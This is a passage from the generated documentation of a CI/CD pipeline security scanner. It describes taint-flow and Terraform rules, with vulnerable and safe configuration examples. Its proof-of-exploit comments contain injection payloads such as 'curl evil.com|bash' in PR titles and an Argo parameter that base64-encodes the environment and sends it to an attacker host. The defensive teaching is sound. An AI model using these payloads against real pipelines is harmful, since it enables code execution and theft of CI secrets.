  extract:
    runs-on: ubuntu-latest
    outputs:
      title: ${{ steps.x.outputs.title }}
    steps:
      - id: x
        env: { RAW: ${{ github.event.issue.title }} }
        run: |
          clean=$(echo "$RAW" | tr -dc 'a-zA-Z0-9 -')
          echo "title=$clean" >> "$GITHUB_OUTPUT"
  use:
    needs: extract
    runs-on: ubuntu-latest
    steps:
      - env: { TITLE: ${{ needs.extract.outputs.title }} }
        run: ./generate-notes --title "$TITLE"
```

**Source:** [`TAINT-002`](../providers/github.md#taint-002) in the [GitHub Actions provider](../providers/github.md).

### `TAINT-003`: Untrusted input forwarded into reusable workflow ``with:`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-003 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Detection walks every ``jobs.<id>.uses: <callee>`` reference, finds every ``with:`` value that interpolates an attacker-controllable source (direct ``${{ github.event.* }}``, a tainted step output via ``${{ steps.<id>.outputs.<name> }}``, or a cross-job ``${{ needs.<job>.outputs.<name> }}``), and flags the forward.

When the callee body is loaded into the same scan (local ``./.github/workflows/<file>.yml`` references via ``--gha-path``, or remote refs fetched by ``--resolve-remote``), the rule also checks whether the callee references ``${{ inputs.<name> }}`` unquoted in a sink. Confirmed end-to-end paths get HIGH confidence; caller-side-only forward stay at MEDIUM (still a risk surface, but a future change to the callee could expose it).

**Recommendation.** Sanitise the value at the caller before forwarding it across the reusable-workflow boundary. The canonical safe pattern is to copy the untrusted source into a step's ``env:`` block, run a sanitiser (``tr -dc 'a-zA-Z0-9 '`` is enough for a freeform title), surface the sanitised result via ``echo "name=$VAR" >> $GITHUB_OUTPUT``, then forward ``${{ steps.<id>.outputs.<name> }}`` as the ``with:`` input. The callee then sees a string-typed value with no expression-evaluation pass left to exploit. If the callee is under your control, also handle the input via env in the callee's ``run:`` body (not direct ``${{ inputs.<name> }}`` interpolation).

**Known false positives.**

- Callees that wrap the input safely (immediately copy into env, sanitise before use) make the caller-side forward harmless. When the callee body is loaded into the scan, the rule downgrades to MEDIUM confidence on those paths; suppress via ignore-file when the callee's handling is audited and sound. Without ``--resolve-remote`` the rule can't see remote callee bodies and every forward stays at MEDIUM, the right default for unverifiable cross-repo flow.

**Proof of exploit.**

```
# Vulnerable: the caller workflow passes an untrusted
# value into a reusable workflow's ``with:`` inputs. The
# reusable workflow inlines the input into a shell
# command without quoting; the injection lands in the
# reusable workflow's runtime even though the caller
# carries the dangerous source.
# caller.yml
on: [issues]
jobs:
  call:
    uses: myorg/repo/.github/workflows/reusable.yml@<sha>
    with:
      title: ${{ github.event.issue.title }}
# reusable.yml
on:
  workflow_call:
    inputs:
      title: { required: true, type: string }
jobs:
  use:
    runs-on: ubuntu-latest
    steps: [{ run: "./gen --title ${{ inputs.title }}" }]

# Safe: sanitise the untrusted value at the caller
# BEFORE forwarding it into ``with:``. The reusable
# workflow can also defensively re-quote inside its own
# step body via env-var indirection.
# caller.yml
on: [issues]
jobs:
  clean:
    runs-on: ubuntu-latest
    outputs: { title: ${{ steps.s.outputs.title }} }
    steps:
      - id: s
        env: { RAW: ${{ github.event.issue.title }} }
        run: |
          clean=$(echo "$RAW" | tr -dc 'a-zA-Z0-9 -')
          echo "title=$clean" >> "$GITHUB_OUTPUT"
  call:
    needs: clean
    uses: myorg/repo/.github/workflows/reusable.yml@<sha>
    with: { title: ${{ needs.clean.outputs.title }} }
```

**Source:** [`TAINT-003`](../providers/github.md#taint-003) in the [GitHub Actions provider](../providers/github.md).

### `TAINT-004`: Untrusted input flows across jobs via dotenv artifact <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-004 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Detection is a two-pass walk over the pipeline. Pass 1 looks for jobs whose scripts write ``KEY=value`` to a file declared under ``artifacts.reports.dotenv:`` and whose ``value`` interpolates an attacker-controllable GitLab predefined variable (the ``UNTRUSTED_VAR_RE`` vocabulary GL-002 already uses). Pass 2 walks every job with a ``needs:`` / ``dependencies:`` link to a producer and looks for ``$KEY`` references in scripts that match a tainted leak.

v1 limitations: ``extends:`` job-template inheritance and cross-pipeline ``include:`` are not yet tracked. The dotenv path matching is literal (``./taint.env`` and ``taint.env`` are treated as the same path), no glob expansion is performed.

**Recommendation.** Sanitise the value at the producer job before it lands in the dotenv file. The canonical safe pattern is to copy the ``$CI_COMMIT_*`` / ``$CI_MERGE_REQUEST_*`` source into an intermediate shell variable, run a sanitiser (``tr -dc 'a-zA-Z0-9 '`` is enough for a freeform title), and only then write the cleaned value to dotenv. The consuming job should still treat the auto-imported variable as tainted, reference it quoted (``"$TITLE"``) and never inline into a command without re-quoting. Removing the dotenv entirely is the strongest fix; if the value genuinely needs to flow downstream, validate the sanitiser is doing what you think before relying on it.

**Known false positives.**

- If the producer job runs a sanitiser between the tainted source interpolation and the dotenv write (``echo "$CI_COMMIT_TITLE" | tr -dc 'a-zA-Z0-9 ' > taint.env``), the consumer is no longer exploitable but TAINT-004 still fires. Suppress via ignore-file scoped to the consumer job's pipeline file when this is the deliberate shape; the sanitiser is then load-bearing and any future regression in it would re-expose the consumer.

**Proof of exploit.**

```
# Vulnerable: an ``extract`` job writes an untrusted
# source (``$CI_COMMIT_MESSAGE``) into a dotenv report
# artifact. GitLab automatically loads dotenv reports
# as env vars in dependent jobs; the consumer job then
# inlines the value into a shell command unquoted, and
# any metacharacters in the source execute there.
extract:
  script:
    - echo "MSG=$CI_COMMIT_MESSAGE" > deploy.env
  artifacts:
    reports:
      dotenv: deploy.env
use:
  needs: [extract]
  script:
    - ./gen-notes --message $MSG

# Safe: sanitise at the producer before writing the
# dotenv file, and quote at the consumer. The cleaned
# value is safe to inline; the consumer's env binding
# is properly quoted.
extract:
  script:
    - clean=$(echo "$CI_COMMIT_MESSAGE" | tr -dc 'a-zA-Z0-9 -')
    - echo "MSG=$clean" > deploy.env
  artifacts:
    reports:
      dotenv: deploy.env
use:
  needs: [extract]
  script:
    - ./gen-notes --message "$MSG"
```

**Source:** [`TAINT-004`](../providers/gitlab.md#taint-004) in the [GitLab CI provider](../providers/gitlab.md).

### `TAINT-005`: Untrusted input flows across steps via ``buildkite-agent meta-data`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-005 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Detection is a two-pass walk over the pipeline. Pass 1 looks for ``buildkite-agent meta-data set <key> <value>`` invocations whose ``<value>`` interpolates an attacker-controllable Buildkite predefined variable (the same ``BUILDKITE_*`` vocabulary BK-003 uses). Pass 2 walks every step for ``buildkite-agent meta-data get <key>`` invocations and matches against the producer keys recorded in pass 1.

Buildkite meta-data is per-build, not per-step; any step in the same build can read what any earlier step wrote regardless of ``depends_on:``. The detector doesn't model temporal ordering and fires whenever both a tainted set and a get of the same key exist in the same pipeline file. v1 limitations: ``meta-data exists`` (returns 0/1 status) and the ``--default`` form aren't tracked; plugins providing their own meta-data abstraction (e.g. ``cattle-ops/github-merged-pr``) aren't introspected.

**Recommendation.** Sanitise the value at the producer step before it lands in the meta-data store. The canonical safe pattern is to copy the ``$BUILDKITE_PULL_REQUEST_*`` / ``$BUILDKITE_MESSAGE`` / branch / commit / author source into an intermediate shell variable, run a sanitiser (``tr -dc 'a-zA-Z0-9 '`` is enough for a freeform title), and only then call ``buildkite-agent meta-data set``. The consuming step should still reference the ``$(buildkite-agent meta-data get ...)`` value quoted (``"$TITLE"``) and never inline into a command without re-quoting. Removing the meta-data flow entirely is the strongest fix; if the value genuinely needs to flow downstream, validate the sanitiser is doing what you think before relying on it.

**Known false positives.**

- If the producer step runs a sanitiser between the tainted source interpolation and the ``meta-data set`` call (``echo "$BUILDKITE_PULL_REQUEST_TITLE" | tr -dc 'a-zA-Z0-9 ' | xargs -I{} buildkite-agent meta-data set title {}``), the consumer is no longer exploitable but TAINT-005 still fires. Suppress via ignore-file scoped to the consumer step's pipeline file when this is the deliberate shape; the sanitiser is then load-bearing and any future regression in it would re-expose the consumer.

**Proof of exploit.**

```
# Vulnerable: a PR titled ``shiny new feature";curl
# evil.com|bash;"`` lands in the meta-data store via the
# producer step. The consumer step reads it back into
# ``$TITLE`` and inlines it into a shell command — the
# injected ``curl`` runs in the consumer's shell with
# the consumer step's full secret set in scope.
steps:
  - label: extract
    command: |
      buildkite-agent meta-data set "title" \
        "$BUILDKITE_PULL_REQUEST_TITLE"
  - wait
  - label: use
    command: |
      TITLE=$(buildkite-agent meta-data get title)
      echo $TITLE
      ./generate-release-notes.sh --title $TITLE

# Safe: sanitise at the producer (drop anything outside
# the expected charset) and quote at the consumer. The
# value is now safe to inline into a shell command — the
# injected metacharacters either never reach meta-data or
# are quoted as one literal argument.
steps:
  - label: extract
    command: |
      clean=$(echo "$BUILDKITE_PULL_REQUEST_TITLE" | \
          tr -dc 'a-zA-Z0-9 -')
      buildkite-agent meta-data set "title" "$clean"
  - wait
  - label: use
    command: |
      TITLE="$(buildkite-agent meta-data get title)"
      ./generate-release-notes.sh --title "$TITLE"
```

**Source:** [`TAINT-005`](../providers/buildkite.md#taint-005) in the [Buildkite provider](../providers/buildkite.md).

### `TAINT-006`: Untrusted input flows across tasks via Tekton ``results`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-006 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Detection walks every ``Pipeline`` document. Pass 1 looks for tasks whose body's ``steps[*].script`` writes to ``$(results.<X>.path)`` AND interpolates a ``$(params.<Y>)`` reference, recording ``X`` as a tainted result for that producer task. Pass 2 walks every task for ``params:`` whose ``value:`` is ``$(tasks.<producer>.results.<X>)``. When ``(producer, X)`` matches a tainted result and the consumer's body's ``steps[*].script`` references ``$(params.<consumer-name>)`` (where consumer-name is the param the result was forwarded into), TAINT-006 fires.

Body resolution: inline ``taskSpec:`` blocks are walked directly; ``taskRef: { name: <X> }`` references resolve against ``Task`` / ``ClusterTask`` documents loaded into the same scan, so a Pipeline that splits the producer / consumer task definitions into separate files still trips the rule. ``bundle:`` and ``resolver:`` (remote OCI / Tekton-resolver-framework references) aren't followed; they require network fetches the scanner deliberately avoids. ``finally:`` blocks aren't walked yet.

**Recommendation.** Sanitise the value at the producer task before it lands in ``$(results.<name>.path)``. The canonical safe pattern is to copy the ``$(params.<name>)`` source into an intermediate shell variable, run a sanitiser (``tr -dc 'a-zA-Z0-9 '`` for a freeform title), and only then write the cleaned value to the result file. The consumer task should still treat its own param as tainted: surface ``$(params.<name>)`` into a quoted shell variable (``TITLE="$(params.title)"``) before interpolating elsewhere. Removing the cross-task results forwarding is the strongest fix; if the value genuinely needs to flow downstream, validate the sanitiser is doing what you think before relying on it.

**Known false positives.**

- If the producer task runs a sanitiser between the tainted ``$(params.X)`` interpolation and the ``$(results.Y.path)`` write, the consumer is no longer exploitable but TAINT-006 still fires. Suppress via ignore-file scoped to the consumer task name when this is the deliberate shape; the sanitiser is then load-bearing.

**Proof of exploit.**

```
# Vulnerable: Task ``extract`` writes the PR title to a
# Tekton ``result``; Task ``use`` reads it back and
# inlines it into a shell command. A PipelineRun whose
# upstream provides ``feat;curl evil|bash;`` for the
# title lands the metacharacters in ``use``'s shell.
apiVersion: tekton.dev/v1
kind: Pipeline
spec:
  params:
    - name: pr-title
  tasks:
    - name: extract
      taskSpec:
        params: [{ name: title }]
        results: [{ name: clean-title }]
        steps:
          - name: extract
            image: alpine@sha256:abc123...
            script: |
              echo -n "$(params.title)" > $(results.clean-title.path)
      params:
        - { name: title, value: $(params.pr-title) }
    - name: use
      runAfter: [extract]
      taskSpec:
        params: [{ name: title }]
        steps:
          - name: use
            image: alpine@sha256:abc123...
            script: |
              ./gen-notes --title $(params.title)
      params:
        - { name: title, value: $(tasks.extract.results.clean-title) }

# Safe: sanitise at the producer Task (strip metacharacters
# to an expected charset) before writing the result, and
# bind the consumer's param to a shell env var that's
# quoted on every use. The injected ``;`` / backticks
# either never reach the result or are quoted away.
apiVersion: tekton.dev/v1
kind: Pipeline
spec:
  tasks:
    - name: extract
      taskSpec:
        params: [{ name: title }]
        results: [{ name: clean-title }]
        steps:
          - name: extract
            image: alpine@sha256:abc123...
            env:
              - { name: RAW, value: $(params.title) }
            script: |
              echo -n "$RAW" | tr -dc 'a-zA-Z0-9 -' \
                > $(results.clean-title.path)
```

**Source:** [`TAINT-006`](../providers/tekton.md#taint-006) in the [Tekton provider](../providers/tekton.md).

### `TAINT-007`: Untrusted input flows across templates via Argo ``outputs.parameters`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-007 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Detection walks every workflow document with ``spec.templates``. Pass 1 looks for templates that declare ``outputs.parameters`` AND whose inline ``script.source`` interpolates ``{{inputs.parameters.<X>}}``, recording the template's outputs as tainted. Pass 2 walks each template's DAG / Steps orchestrator for tasks whose ``arguments.parameters[*].value`` is ``{{tasks.<producer>.outputs.parameters.<X>}}`` matching a recorded leak. Pass 3 walks the consumer task's referenced template for the matching ``{{inputs.parameters.<consumer-param>}}`` reference in its script body and emits one path per match.

v1 limitations: ``workflowTemplateRef:`` cross-document references aren't resolved (would need the same machinery as the GHA ``--resolve-remote`` flow). ``onExit:`` exit handlers aren't yet walked.

**Recommendation.** Sanitise the value at the producer template before it lands in an output parameter. The canonical safe pattern is to surface ``{{inputs.parameters.<X>}}`` into a quoted shell variable, run a sanitiser (``tr -dc 'a-zA-Z0-9 '`` for a freeform title), and only then redirect the cleaned value to the output path. The consumer template should still reference ``{{inputs.parameters.<name>}}`` quoted (``"{{inputs.parameters.title}}"``) and never inline into a command without re-quoting. Removing the cross-template forwarding is the strongest fix; if the value genuinely needs to flow downstream, validate the sanitiser is doing what you think before relying on it.

**Known false positives.**

- If the producer template runs a sanitiser between the tainted ``{{inputs.parameters.X}}`` interpolation and the output-path write, the consumer is no longer exploitable but TAINT-007 still fires. Suppress via ignore-file scoped to the consumer template name when this is the deliberate shape; the sanitiser is then load-bearing.

**Proof of exploit.**

```
# Vulnerable: producer template hands a tainted parameter
# through outputs.parameters; consumer interpolates it into
# its own shell.
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata: { generateName: ci- }
spec:
  entrypoint: main
  arguments: { parameters: [ { name: title } ] }
  templates:
    - name: main
      dag:
        tasks:
          - name: produce
            template: read-title
            arguments:
              parameters:
                - name: title
                  value: '{{workflow.parameters.title}}'
          - name: consume
            template: ship
            dependencies: [produce]
            arguments:
              parameters:
                - name: clean_title
                  value: '{{tasks.produce.outputs.parameters.title}}'
    - name: read-title
      inputs: { parameters: [ { name: title } ] }
      outputs:
        parameters:
          - name: title
            valueFrom: { path: /tmp/title.txt }
      script:
        image: alpine:3.20
        command: [sh]
        # BUG: tainted input written to output path unchanged.
        source: echo '{{inputs.parameters.title}}' > /tmp/title.txt
    - name: ship
      inputs: { parameters: [ { name: clean_title } ] }
      script:
        image: alpine:3.20
        command: [sh]
        # BUG: re-interpolation into shell.
        source: |
          curl https://api/announce --data-urlencode \
            "title={{inputs.parameters.clean_title}}"

# Attack: caller submits the workflow with a parameter that
# carries shell:
#
#   argo submit wf.yml \
#     -p title='ok";curl attacker/x -d "$(env|base64)";echo "'
#
# ``read-title`` writes the tainted bytes verbatim to
# /tmp/title.txt; Argo hands them through ``outputs.
# parameters.title`` into the consumer's ``clean_title``
# input; the consumer's ``source:`` interpolates them back
# into the shell. The container's ServiceAccount carries
# whatever privilege you've granted the workflow.

# Safe: sanitise in the producer before writing the output,
# and keep the consumer's reference quoted as an extra belt.
    - name: read-title
      inputs: { parameters: [ { name: title } ] }
      outputs:
        parameters:
          - name: title
            valueFrom: { path: /tmp/title.txt }
      script:
        image: alpine:3.20
        command: [sh]
        env:
          - name: RAW
            value: '{{inputs.parameters.title}}'
        source: printf '%s' "$RAW" | tr -dc 'a-zA-Z0-9 ' > /tmp/title.txt
```

**Source:** [`TAINT-007`](../providers/argo.md#taint-007) in the [Argo Workflows provider](../providers/argo.md).

### `TAINT-008`: Untrusted input flows via GitLab ``extends:`` template inheritance <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-008 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Two-pass walk over the pipeline doc. Pass 1 builds a universe of every job-shaped entry (hidden templates included, top-level keywords excluded), resolves each non-hidden job's ``extends:`` chain transitively, and gathers tainted variables (any ``$CI_COMMIT_*`` / ``$CI_MERGE_REQUEST_*`` interpolation in the link's ``variables:`` block). Pass 2 walks the consuming job's ``before_script:`` / ``script:`` / ``after_script:`` for unquoted ``$<name>`` references matching an inherited tainted variable. Cycles in the extends chain are broken via a visited set; unresolvable extends entries are silently dropped.

v1 limitations: ``include:`` cross-pipeline file inclusion isn't tracked yet (would need cross-document analysis like the GHA ``--resolve-remote`` flow). ``extends:`` chains that pull templates from include-d files are partial: in-doc links resolve, external links are treated as missing.

**Recommendation.** Move the tainted-source interpolation out of the template's ``variables:`` block. The canonical safe pattern is to receive the source value through ``$CI_*`` directly in the consuming job's script (or a dedicated sanitiser step) and never copy it into a shared variable a downstream job can interpolate unquoted. If the inheritance is genuinely needed, sanitise at the boundary (``TITLE_SAFE: '$(echo "$CI_COMMIT_TITLE" | tr -dc "a-zA-Z0-9 ")'``) and have the extending job reference the cleaned variable. Removing the ``extends:`` propagation is the strongest fix; if the value genuinely needs to flow downstream, validate the sanitiser is doing what you think before relying on it.

**Known false positives.**

- If the consuming job sanitises the inherited variable before referencing it (``CLEAN=$(echo "$TITLE" | tr -dc 'a-zA-Z0-9 '); echo $CLEAN``), the rule still fires on the original ``$TITLE`` reference even though the sanitised value is what reaches the shell. Suppress via ignore-file scoped to the consuming job's name when the sanitiser is audited and load-bearing.

**Proof of exploit.**

```
# Vulnerable: hidden template ``.base`` interpolates
# ``$CI_COMMIT_TITLE`` (attacker-controllable via MR
# title) into a ``variables:`` block. Job ``build``
# extends ``.base`` and references ``$TITLE`` unquoted
# in a shell command. A MR titled ``feat;curl
# evil|bash;`` executes the injected curl. GL-002
# misses this because it skips hidden-job templates.
.base:
  variables:
    TITLE: $CI_COMMIT_TITLE
build:
  extends: .base
  script:
    - echo Building $TITLE
    - ./generate-notes --title $TITLE

# Safe: receive the source value at the consumer (not
# the template), sanitise it once, and reference the
# cleaned variable quoted from then on. The hidden
# template no longer carries any attacker-controllable
# variable.
.base:
  before_script:
    - echo "Job $CI_JOB_NAME starting"
build:
  extends: .base
  script:
    - clean=$(echo "$CI_COMMIT_TITLE" | tr -dc 'a-zA-Z0-9 -')
    - echo "Building $clean"
    - ./generate-notes --title "$clean"
```

**Source:** [`TAINT-008`](../providers/gitlab.md#taint-008) in the [GitLab CI provider](../providers/gitlab.md).

### `TF-001`: Plan declares aws_iam_access_key (long-lived credential) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-tf-001 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Fires on every ``aws_iam_access_key`` in the plan. Terraform writes the resulting ``secret`` to state, even on remote backends, the secret is now in every state-file backup, every CI run, and anywhere ``terraform output`` ran.

**Recommendation.** Replace static keys with role-based access: an ``aws_iam_role`` plus an OIDC ``aws_iam_openid_connect_provider`` for CI, or ``aws_iam_role`` for service-to-service auth. Static keys live forever in state, in backups, in every machine that ever ran ``terraform plan``.

**Proof of exploit.**

```
# Vulnerable: every ``terraform apply`` provisions a long-
# lived access key and lands the literal
# ``aws_iam_access_key.ci.secret`` in the state file. Remote
# backends (S3) store the state plaintext by default; every
# CI run that loads state reads the secret. The key only
# goes away on ``terraform destroy``.
resource "aws_iam_user" "ci" {
  name = "ci-bot"
}

resource "aws_iam_access_key" "ci" {
  user = aws_iam_user.ci.name
}

output "ci_secret" {
  value     = aws_iam_access_key.ci.secret
  sensitive = true   # masks console output but state stays plaintext
}

# Safe: federate via GitHub Actions OIDC so tokens last
# minutes per workflow run, not forever. The role's trust
# policy pins ``sub`` to one repo + ref, so the federation
# can't be assumed by an unrelated workflow even on the
# same account.
resource "aws_iam_openid_connect_provider" "github" {
  url             = "https://token.actions.githubusercontent.com"
  client_id_list  = ["sts.amazonaws.com"]
  thumbprint_list = ["6938fd4d98bab03faadb97b34396831e3780aea1"]
}

resource "aws_iam_role" "ci" {
  name = "ci-bot"
  assume_role_policy = jsonencode({
    Statement = [{
      Effect    = "Allow"
      Principal = { Federated = aws_iam_openid_connect_provider.github.arn }
      Action    = "sts:AssumeRoleWithWebIdentity"
      Condition = {
        StringEquals = {
          "token.actions.githubusercontent.com:sub" = "repo:myorg/myrepo:ref:refs/heads/main"
          "token.actions.githubusercontent.com:aud" = "sts.amazonaws.com"
        }
      }
    }]
  })
}
```

**Source:** [`TF-001`](../providers/terraform.md) in the [Terraform provider](../providers/terraform.md).

### `TF-002`: Stateful data-store resource carries a plaintext secret <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-tf-002 }

**Evidences:** [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code, [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Walks every value of the stateful data-store resources (``aws_db_instance``, ``aws_rds_cluster``, ``aws_redshift_cluster``, ``aws_elasticache_replication_group``, ``aws_docdb_cluster``, ``aws_neptune_cluster``, ``aws_opensearch_domain``, ``aws_memorydb_cluster``). Fires when a string leaf matches a credential shape (AKIA/ASIA, ``ghp_``, JWT, …) OR when a secret-named attribute (``*password``, ``*token``, …) carries a non-placeholder literal.

**Recommendation.** Move the secret into Secrets Manager (or SSM Parameter Store SecureString) and reference it via ``data.aws_secretsmanager_secret_version.…`` at apply time. Never literal-string a credential into a stateful resource — the value lives in state forever.

**Proof of exploit.**

```
# Vulnerable: the password literal lands in the Terraform
# state file on every apply. Remote S3 backends store state
# in plaintext unless explicitly encrypted; CI runs that
# load state print the value when ``-json`` or ``output``
# touches it. The credential rotates only on the next
# ``aws_db_instance`` replacement.
resource "aws_db_instance" "prod" {
  identifier        = "app-prod"
  engine            = "postgres"
  instance_class    = "db.t3.medium"
  allocated_storage = 100
  username          = "appuser"
  password          = "hunter2-prod-master-pw"
}

# Safe: pull the password from Secrets Manager at apply time.
# State carries the secret's ARN reference, not the value.
# Rotation runs via Secrets Manager without a Terraform
# state change. The data source is read-only, so the value
# never appears in ``terraform plan`` output either.
data "aws_secretsmanager_secret_version" "db_master" {
  secret_id = "prod/app/db_master"
}

resource "aws_db_instance" "prod" {
  identifier        = "app-prod"
  engine            = "postgres"
  instance_class    = "db.t3.medium"
  allocated_storage = 100
  username          = "appuser"
  password          = data.aws_secretsmanager_secret_version.db_master.secret_string
}
```

**Source:** [`TF-002`](../providers/terraform.md) in the [Terraform provider](../providers/terraform.md).

### `TF-003`: CodeBuild VPC config references a public subnet <span class="pg-sev pg-sev--high">HIGH</span> { #detail-tf-003 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** When ``aws_codebuild_project.vpc_config[0].vpc_id`` resolves to a concrete string, walks every ``aws_subnet`` in the same VPC and fires if any has ``map_public_ip_on_launch = true``. Silent when ``vpc_id`` is unresolved (``known after apply``).

**Recommendation.** Place CodeBuild projects in private subnets (``map_public_ip_on_launch = false``) with egress routed through a NAT gateway or VPC interface endpoints. Public subnets put the build host on a public IP for the duration of the build.

**Proof of exploit.**

```
# Vulnerable: ``map_public_ip_on_launch = true`` on the
# subnet means CodeBuild containers get a public IP for the
# duration of the build. The build host is now reachable
# inbound from the internet (modulo the security group),
# and outbound traffic uses that public IP rather than
# being NATed. Build-time RCE escalates straight to a
# direct internet-facing host.
resource "aws_subnet" "build" {
  vpc_id                  = aws_vpc.main.id
  cidr_block              = "10.0.1.0/24"
  map_public_ip_on_launch = true
}

resource "aws_codebuild_project" "app" {
  name = "app-build"
  vpc_config {
    vpc_id             = aws_vpc.main.id
    subnets            = [aws_subnet.build.id]
    security_group_ids = [aws_security_group.build.id]
  }
  # ... source / artifacts / environment elided
}

# Safe: private subnet routed to a NAT for outbound egress.
# No public IP on the build host; inbound from the internet
# is impossible regardless of the security group. Build-
# time RCE has to chain a separate primitive (kubelet, IMDS,
# another in-VPC service) before reaching the internet.
resource "aws_subnet" "build" {
  vpc_id                  = aws_vpc.main.id
  cidr_block              = "10.0.10.0/24"
  map_public_ip_on_launch = false
}

resource "aws_route_table_association" "build" {
  subnet_id      = aws_subnet.build.id
  route_table_id = aws_route_table.private_nat.id
}
```

**Source:** [`TF-003`](../providers/terraform.md) in the [Terraform provider](../providers/terraform.md).

## Not covered

Org-admin controls that require account-level audit endpoints, MFA
enforcement (1.3.4), member inventories (1.3.1), installed-app lists
(1.4.2), and similar — are listed in the benchmark but not yet
evidenced by an `SCM-*` rule. Open an issue if your team would value
coverage; the GitHub Admin API surface is the next planned expansion
of the SCM provider.

---

_This page is generated. Edit `pipeline_check/core/standards/data/cis_github.py` (mappings) or `scripts/gen_standards_docs.py` (intro / per-control prose) and run `python scripts/gen_standards_docs.py cis_github`._
